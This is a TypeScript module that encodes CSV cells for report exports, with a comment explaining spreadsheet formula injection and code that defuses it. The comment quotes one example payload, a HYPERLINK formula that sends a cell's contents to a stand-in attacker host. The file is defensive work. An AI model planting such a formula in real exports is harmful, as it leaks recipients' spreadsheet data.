/**
 * CSV cell encoding for the report exports.
 *
 * Quoting alone is not enough. Excel, Google Sheets and LibreOffice treat a
 * cell beginning `=`, `+`, `-`, `@`, or a leading tab/CR as a formula even when
 * it arrived quoted, so a value like
 *
 *   =HYPERLINK("https://evil.example?x="&A1,"click")
 *
 * becomes a live formula in the recipient's spreadsheet. The exported columns
 * include `Developer` (GitHub display name), `Types` and `Active Repos` — all
 * attacker-influenced for anyone who can push to a scanned repo or set their
 * own GitHub profile name — and the team export is additionally copied to the
 * clipboard for pasting straight into a new Google Sheet.
 *
 * Prefixing with a single quote is the conventional neutraliser: spreadsheet
 * apps treat the cell as text and do not display the quote.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/** Encode one value as a CSV field: formula-neutralised, quoted, quotes doubled. */
export function csvCell(value: unknown): string {
  let s = value === null || value === undefined ? '' : String(value);
  // Strip characters that break row framing regardless of quoting.
  s = s.replace(/\r\n|\r|\n/g, ' ');
  if (FORMULA_LEAD.test(s)) s = `'${s}`;
  return `"${s.replace(/"/g, '""')}"`;
}

/** Encode a full sheet. */
export function toCsv(rows: ReadonlyArray<ReadonlyArray<unknown>>): string {
  return rows.map((r) => r.map(csvCell).join(',')).join('\n');
}
